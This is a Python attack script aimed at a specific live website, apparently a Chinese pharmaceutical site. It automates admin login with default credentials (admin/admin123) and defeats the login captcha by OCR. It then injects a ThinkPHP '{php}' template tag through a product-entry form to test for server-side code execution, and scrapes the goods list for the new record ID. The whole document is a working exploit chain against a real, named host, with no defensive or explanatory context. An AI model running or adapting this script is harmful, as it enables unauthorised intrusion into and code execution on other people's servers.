#!/usr/bin/env python3
"""gz: submit adddrugs with ALL fields + {php} tag, find new id, test frontend"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys, uuid

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = "import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); print(o.classification(base64.b64decode('%s')))" % b64
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None, raw=None):
    h = {**UA}
    if raw:
        h["Content-Type"] = "multipart/form-data; boundary=" + raw[0]
    else:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    if headers: h.update(headers)
    try:
        body = raw[1] if raw else (data.encode() if data else None)
        req = urllib.request.Request(url, data=body, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok")
            break
    except Exception:
        pass

# full adddrugs submit
boundary = "----B" + uuid.uuid4().hex
def mp_field(name, value):
    return ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (boundary, name, value)).encode()

fields = [
    ("drugs_name", "tpl_test_2026"),
    ("drugs_spname", "tpl_test"),
    ("drugs_pyname", "tpl"),
    ("drugs_brief_ingredients", "test"),
    ("factory_id", "1"),
    ("drugs_disease", "test"),
    ("drugs_brief_indication", "test"),
    ("is_best", "0"),
    ("drugs_status", "1"),
    ("sort_order", "0"),
    ("drugs_instructions", '{php}echo "GZ_TPPHP_999";{/php}'),
]
parts = b"".join(mp_field(n, v) for n, v in fields)
parts += ("--%s--\r\n" % boundary).encode()

code, final, resp = fetch(HOST + "/index.php?m=admin&c=goods&a=adddrugspost",
                          headers={"Referer": HOST + "/index.php?m=admin&c=goods&a=adddrugs"},
                          raw=(boundary, parts))
rt = resp.decode("utf-8", "ignore")
print("adddrugspost:", code, rt[:250])

# check goods list
code, final, body = fetch(HOST + "/index.php?m=admin&c=goods&a=index",
                          headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
bt = body.decode("utf-8", "ignore")
open("/tmp/gz_goods3.html", "w").write(bt)
rows = re.findall(r'<tr[^>]*>(.*?)</tr>', bt, re.S)
for r in rows:
    cells = re.findall(r'<td[^>]*>(.*?)</td>', r, re.S)
    clean = [re.sub(r'<[^>]+>', '', c).strip()[:30] for c in cells]
    if len(clean) > 3 and clean[0].isdigit():
        print("ID", clean[0], "|", clean[2])
